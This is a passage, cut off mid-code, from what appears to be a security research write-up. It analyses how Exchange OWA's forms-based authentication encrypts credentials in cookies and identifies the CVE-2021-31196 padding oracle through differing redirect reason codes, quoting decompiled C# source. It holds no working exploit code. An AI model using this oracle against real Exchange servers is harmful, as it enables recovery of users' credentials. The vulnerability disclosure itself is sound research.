&lt;p&gt;HTTP is a stateless protocol. To keep your login state, FBA saves the username and password in cookies. Every time you visit the OWA, Exchange will parse the cookies, retrieve the credential and try to log in with that. If the login succeed, Exchange will serialize your User Identity into a string, put it into the header of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt;, and forward it to the Backend&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\FbaModule.cs&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnBeginRequestInternal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpApplication&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AuthType&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;FBA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;HandleFbaAuthFormPost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ParseCadataCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MissingSslCertificateException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;NameValueCollection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nameValueCollection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;NameValueCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;nameValueCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CafeError&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ErrorFE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FEErrorCodes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSLCertificateProblem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;302&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AspNetHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetCafeErrorPageRedirectUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nameValueCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;OnBeginRequestInternal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;All the cookies are encrypted to ensure even if an attacker can hijack the HTTP request, he/she still couldn‚Äôt get your credential in plaintext format. FBA leverages 5 special cookies to accomplish the whole de/encryption process:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadata&lt;/code&gt; - The encrypted username and password&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadataTTL&lt;/code&gt; - The Time-To-Live timestamp&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadataKey&lt;/code&gt; - The KEY for encryption&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadataIV&lt;/code&gt; - The IV for encryption&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cadataSig&lt;/code&gt; - The signature to prevent tampering&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The encryption logic will first generate two 16 bytes random strings as the IV and KEY for the current session. The username and password will then be encoded with Base64, encrypted by the algorithm AES and sent back to the client within cookies. Meanwhile, the IV and KEY will be sent to the user, too. To prevent the client from decrypting the credential by the known IV and KEY directly, Exchange will once again use the algorithm RSA to encrypt the IV and KEY via its SSL certificate private key before sending out!&lt;/p&gt;

&lt;p&gt;Here is a Pseudo Code for the encryption logic:&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;@key&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetServerSSLCert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetPrivateKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadataSig&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Fba Rocks!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadataIV&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetRandomBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadataKey&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetRandomBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

 &lt;span class=&quot;n&quot;&gt;@timestamp&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetCurrentTimestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadataTTL&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AES_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cadataKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cadataIV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

 &lt;span class=&quot;n&quot;&gt;@blob&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Basic &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ToBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;cadata&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AES_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cadataKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cadataIV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;@blob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The Exchange takes CBC as its padding mode. If you are familiar with Cryptography, you might be wondering whether the CBC mode here is vulnerable to the Padding Oracle Attack? Bingo! As a matter of fact, Padding Oracle Attack is still existing in such essential software like Exchange in 2021!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/3.gif&quot; alt=&quot;&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;cve-2021-31196---the-padding-oracle&quot;&gt;CVE-2021-31196 - The Padding Oracle&lt;/h1&gt;

&lt;p&gt;When there is something wrong with the FBA, Exchange attaches an error code and redirects the HTTP request back to the original login page. So where is the Oracle? In the cookie decryption, Exchange uses an exception to catch the Padding Error, and because of the exception, the program returned immediately so that error code number is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, which means &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;None&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Location: /OWA/logon.aspx?url=‚Ä¶&amp;amp;reason=0&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In contrast with the Padding Error, if the decryption is good, Exchange will continue the authentication process and try to login with the corrupted username and password. At this moment, the result must be a failure and the error code number is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2&lt;/code&gt;, which represents &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InvalidCredntials&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Location: /OWA/logon.aspx?url=‚Ä¶&amp;amp;reason=2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The diagram looks like:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the difference, we now have an Oracle to identify whether the decryption process is successful or not.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\FbaModule.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ParseCadataCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpApplication&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadataKey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadataIV&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text4&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadataSig&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cadataTTL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;RSACryptoServiceProvider&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsacryptoServiceProvider&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x509Certificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PrivateKey&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RSACryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rgb2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rgb3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsacryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rgb2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;array2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsacryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rgb3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AesCryptoServiceProvider&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aesCryptoServiceProvider&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AesCryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;aesCryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;aesCryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        
        &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ICryptoTransform&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptoTransform2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aesCryptoServiceProvider&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CreateDecryptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
